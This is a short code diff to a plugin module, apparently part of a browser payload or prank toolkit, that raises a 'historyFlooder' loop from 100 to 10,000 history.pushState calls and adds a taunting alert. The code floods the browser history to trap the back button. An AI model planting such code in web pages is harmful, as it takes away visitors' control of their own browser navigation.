@@ -2,12 +2,13 @@ import { moduleDefinition } from '../../moduleapi'
 
 function historyFlooder() {
     let i = 0
-    while (i < 100) {
+    while (i < 10000) {
         history.pushState(0, '', i.toString())
         i++
     }
-
     history.pushState(0, '', window.location.href)
+
+    alert("Flooded history 10k times ;)")
 }
 
 const plugin: moduleDefinition = {
